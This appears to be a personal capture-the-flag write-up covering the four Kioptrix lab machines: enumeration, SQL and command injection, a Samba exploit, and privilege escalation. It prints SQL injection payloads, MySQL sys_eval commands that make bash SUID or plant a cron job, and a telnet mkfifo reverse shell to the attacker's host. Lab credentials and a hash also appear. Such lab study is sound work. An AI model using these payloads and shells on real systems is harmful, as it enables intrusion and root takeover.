# CTF 8. Kioptrix

## Introduction

* This involves the CTF Machine name ‘Kioptrix’.

## Independent Challenges

### Target 1 (Kioptrix Level 1)

#### Network Service Enumeration

| Server IP Address | Open Ports                  |
| ----------------- | --------------------------- |
| 192.168.0.108     | 22, 80, 111, 139, 443, 1024 |

**ARP-Scan**

* To find the IP Address of VM.
* Port Scan using Nmap
* Skip port 22 SSH because its an older machine its not design to go with SSH.

**Enumeration for 80**

* Default Web Page.

Nikto Scan

* /manual/: Directory indexing found.
* /manual/: Web server manual found.
* /icons/: Directory indexing found.
* /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
* /test.php: This might be interesting.
* /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
* /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
* /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
* /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
* /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
* /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.
* /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.
* /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.
* /shell?cat+/etc/hosts: A backdoor was identified.
* /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
* 8908 requests: 0 error(s) and 30 item(s) reported on remote host
* End Time: 2024-03-06 14:22:45 (GMT-5) (47 seconds)

**Directory Fuzzing**

* Found some exploit for Apache version. But decided to move to SMB.

**SMB Enumeration**

**NSE Scan for SMB**

Smbclinet

**Enumeration in Enum4linux**

* No luck on enumeration decided to with Metasploit Auxiliary.
* Right way to start Metasploit:

```bash
#Msfdb run
```

* Scan give me the information about ‘Samba2.2.1a’
* Google Seach of what is Samba 2.2.1a
* Its vulnerably to Buffer Overflow.

https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/

* Found the exploit in seachsploit so used the Metasploit to get the perfect Shell.
* Seems like the payload works but session deid due to some reasons.
* Try to change the payload to linux/x86/shell\_reverse\_tcp. And it works.
* Used the revshell to get the better shell

### Target 2 (Kioptrix Level 2)

#### Network Service Enumeration

| Server IP Address | Open Ports                       |
| ----------------- | -------------------------------- |
| 192.168.50.70     | 22, 80, 111, 443, 624, 631, 3306 |

Nmap Scan Result

* Found these open ports in Nmap Scan.
* Aggressive Scan

#### Enumeration

* Fuzz the application.
* Port 22 SSH
* Port 80 HTTP
* Nikto Scan
* SearchSploits\
  seachsploit Apache httpd 2.0. 52
* Port 624
* Port 631

#### Initial Access - (SQL Injection & Command Injection)

* Vulnerability Explanation:
  * SQL injection: Where the attacker performs the query which lead to delete, modify the query which was not intended by developer.
  * Command Injection: Where the attacker performs the Operating systems commands which lead to execute in Server which was not intended by developer.
* Vulnerability Fix: Sanitized the SQL Query.
* Severity: Critical

Steps to Reproduce

* Using the SQL true statement to bypass the password requirements.
* Got the Query from PayloadAlltheThing..
* Link: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/README.md

```
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```

* Got the access from the SQL injected Query of Admin.
* The page which is open was index.php and when the submit the NIC ping its redirected to pingit.php
* Mostly it seems that the pingit.php is using ICMP ping to the OS and Giving the output back.
* Most like it can be vulnerable to Command Injection.
* Vulnerability Explanation:
  * Prerequisites to get the initial access using reverse shells
  * Revshells: https://www.revshells.com/
  * NC Listener is required
  * To validate that using ‘which’ command like example below

Example of whoami

* Same process for availability of NC listener.
* Nc Listener is not there in the Target OS.
* So preferred with the bash reverse shell generated from revshell above & NC listing on port 80. (use the common open ports like 53,443)

#### Privileged Escalation - (CUP 1.1)

* Vulnerability Explanation: CUPS is software which allow to use printing functionality of web browser.\
  The first time you print to a printer, CUPS creates a queue to keep track of the current status of the printer (everything OK, out of paper, etc.) and any pages you have printed.
  * For more information Link: https://www.cups.org/doc/overview.html#
  * Exploit link: https://www.exploit-db.com/exploits/41233
* Vulnerability Fix: Update the software to the recommended.
* Severity: critical.

Steps to Reproduce

* Operating System Enumeration using LINPEAS.
* No Luck with LinPeas ☹.
* Found an exploit of CUP in internet
* Download it and host a service to transfer and execute the exploit after the exploit is in C to first comply the exploit and the run.

### Target 3 (Kioptrix Level 3)

#### Network Service Enumeration

| Server IP Address | Open Ports |
| ----------------- | ---------- |
| 192.168.100.141   | 22, 80     |

#### Mission Recon

* Fuzzing the application.
* In title found some information: - about ligoat security.
* To further recon check the source code.

#### Content Discovery

* It seems like they open a new website or website directory.
* Wappalyzer for OS Recon.
* Added the local DNS entry in local host which is /etc/hosts to load the images of /gallery/.

#### Nmap Scan Result

* Found these open ports in Nmap Scan.
* The login Page
* Searchsploit
* There is an RCE Metasploit
  * Right way to start Metasploit
* Metasploit
* Set URI
* Metasploit didn’t work in my case ☹
* Found the CMS-Exploit form internet.
* Spawning the TTY shell / terminal for better view of terminal and found the two users.
* There is nothing in the Dreg user.
* Other user loneferret has some files
* The file checksec.sh has misconfigured Sudo SUID. Because it gives execute permission to another group as a root privileges.
* Linpease for OS analysis.
* Directory discovery using ffuf.
* It shows the phpMyAdmin page with no null password of admin.
* There are too many files
* By reading on the gconfig.php file there in a root credential of phpadmin
* In the dev\_account found the two-hash value.
* As previews know the dregs user don’t have anything.

Cracked Hash is “starwars”

* ssh

Hint

Here error occur. In order to fix this error we will run command `export TERM=xterm`. Then run again sudo ht.

```bash
export TERM=xterm
sudo ht
```

* This screen will open in effect of `sudo ht` command. Press “ALT + F” to open navigation window search `/etc/passwd`
* change the loneferret id to 0 which is equal to root

Use ALT + F and save it.

* Reconnect the ssh connection. And then it's done.

### Target 4 (Kioptrix Level 4)

#### Network Service Enumeration

| Server IP Address | Open Ports |
| ----------------- | ---------- |
| 192.168.100.128   | 22, 80     |

#### Mission Recon

* Netdiscover for IP address
* Check the source code got nothing useful.
* Operating System is ubuntu --> Lang --> PHP --> Apache
* Nikto scan for more information
* Show the php and apache is outdated.
* Nmap scan
* SMB anonymous login works
* NSE SMB script.
* Enum4linux For more SMB information.

#### Content Discovery

* Wappalyzers
* Gobusters
* Sqlmap
  * To give the URL to sqlmap its requesting as a post request so used burp to capture the request and feed it into SQL map.
* SQLi
  * Username field is not vulnerability to SQLi.
* Used URL encoding and found the password field is Vuln to SQLi
* Used the burpsuite request parameters and assign to SQLMap for automations.

“ \* ” for SQLMAP references that is the password fields.

* Used `-a` for all and `.req` is a file where the data is stored for Sqlmap
* The sqlmap refrence that the below payload works.
* Try that on burp it doesn’t work, and burp intruder payloads does work as its shown in burp intruder.
* And its did work in the Firefox browser maybe something is wrong from burp side or something is preventing for the same

The payloads which work is Payloads -7485' OR 8578=8578#

* Found more user in database.
* Found another user database member credentials in hash.
* Failed to crack the hash

Credentials

```
username:- john
password:- MyNameIsJohn

username: robert
password: ADGAdsafdfwt4gadfga==
```

* let try this into the services and different usernames,
* Netexec for password spray.

#### SSH Initial Access

* Got the restricted TTY Shell.
* Used Echo binary to know about the current shell.

http://www.kornshell.com/info/

Its custom shell developed in C.

https://zweilosec.github.io/posts/upgrade-linux-shell/

Found the command for tty shell for bin/bash using echo binary

```bash
echo os.system('/bin/bash')
```

Worked

* Login into mysql.

```
mysql> select Host,User,Password from user;

+-----------+------------------+-------------------------------------------+
| Host      | User             | Password                                  |
+-----------+------------------+-------------------------------------------+
| localhost | root             |                                           |
| Kioptrix4 | root             |                                           |
| 127.0.0.1 | root             |                                           |
| localhost |                  |                                           |
| Kioptrix4 |                  |                                           |
| localhost | debian-sys-maint | *3AC38ADE5482EA4DE628D0D43BF8FA41E3CF3879 |
+-----------+------------------+-------------------------------------------+
```

Able to read the congrat.txt without privileges escalation.

#### Privileges Escalation

* Linpease results show that mysql root user have null password.

SUID

User SUID

ld.so privesc exploit example

https://book.hacktricks.xyz/linux-hardening/privilege-escalation/ld.so.conf-example

* Sys\_eval is a mysql fun which used root privileges.
* Used Copilot to create a file using mysql function.
* Echo to check the bash commands works
* Create a file to check the file is executed with root privileges.

```
('echo “Hello World!”');
```

* Yes the files are created with Root Users.
* Checking /etc/passwd.
* It means that the SQL can read and write the particular files.
* And the SQL doesn’t create a folder but it can create files.
* It cannot replace any files
* There are many ways to Get the root Privileges now.
* The easy way will be change the john privilege to root privileges.

```sql
SELECT sys_eval(‘chmod u+s /bin/bash’)
```

* Checking the SUID binary is created for user.

```bash
bash -p
```

* Checking the shell privileges
* That same will sys\_eval function work as same as sys\_exec function.
* CRON Job
* Linpeas Output for Cron Job.

```sql
select sys_eval(‘echo “cp /bin/bash /tmp/bash; chmod +s /tmp/bash” > /etc/cron.hourly/.placeholder’);
```

* Verify that the cammands is executed in Cron Job.
* Verification
* Reverse shell
  * Used Online Reverse shell Telnet method.
  * Generate the shell.
* Execute the shell.

```sql
select sys_eval (‘TF=$(mktemp -u);mkfifo $TF ^^ telnet KALI LINUX IP PORTNUMBER 0<$TF | sh 1> $TF’);
```

* Listening for reverse shell.
  * Got the Reverse Shells on Root privileges.
